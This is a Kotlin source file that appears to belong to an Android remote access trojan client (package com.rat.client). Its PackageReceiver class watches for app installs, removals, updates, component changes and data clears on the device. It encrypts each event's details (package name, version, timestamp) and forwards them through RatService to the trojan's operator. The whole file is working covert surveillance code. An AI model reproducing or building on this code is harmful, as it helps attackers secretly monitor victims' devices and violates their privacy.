package com.rat.client.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log
import com.rat.client.crypto.EncryptionUtils
import com.rat.client.service.RatService

class PackageReceiver : BroadcastReceiver() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "PackageReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        val packageName = intent.data?.schemeSpecificPart ?: return

        // Skip our own package
        if (packageName == context.packageName) return

        val service = RatService.getInstance()
        val pm = context.packageManager

        when (action) {
            Intent.ACTION_PACKAGE_ADDED -> {
                val replacing = intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)
                val data = mapOf(
                    "event" to if (replacing) "PACKAGE_REPLACED" else "PACKAGE_ADDED",
                    "package" to packageName,
                    "replacing" to replacing,
                    "version" to getVersionName(pm, packageName),
                    "timestamp" to System.currentTimeMillis()
                )
                service?.sendCommand("package_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
            }
            Intent.ACTION_PACKAGE_REMOVED -> {
                val replacing = intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)
                val data = mapOf(
                    "event" to if (replacing) "PACKAGE_REPLACED" else "PACKAGE_REMOVED",
                    "package" to packageName,
                    "replacing" to replacing,
                    "timestamp" to System.currentTimeMillis()
                )
                service?.sendCommand("package_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
            }
            Intent.ACTION_PACKAGE_REPLACED -> {
                val data = mapOf(
                    "event" to "PACKAGE_REPLACED",
                    "package" to packageName,
                    "version" to getVersionName(pm, packageName),
                    "timestamp" to System.currentTimeMillis()
                )
                service?.sendCommand("package_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
            }
            Intent.ACTION_PACKAGE_CHANGED -> {
                val data = mapOf(
                    "event" to "PACKAGE_CHANGED",
                    "package" to packageName,
                    "components" to intent.getStringArrayListExtra(Intent.EXTRA_CHANGED_COMPONENT_NAME_LIST),
                    "timestamp" to System.currentTimeMillis()
                )
                service?.sendCommand("package_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
            }
            Intent.ACTION_PACKAGE_DATA_CLEARED -> {
                val data = mapOf(
                    "event" to "PACKAGE_DATA_CLEARED",
                    "package" to packageName,
                    "timestamp" to System.currentTimeMillis()
                )
                service?.sendCommand("package_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
            }
        }
    }

    private fun getVersionName(pm: PackageManager, packageName: String): String {
        return try {
            pm.getPackageInfo(packageName, 0).versionName
        } catch (e: Exception) {
            "unknown"
        }
    }
}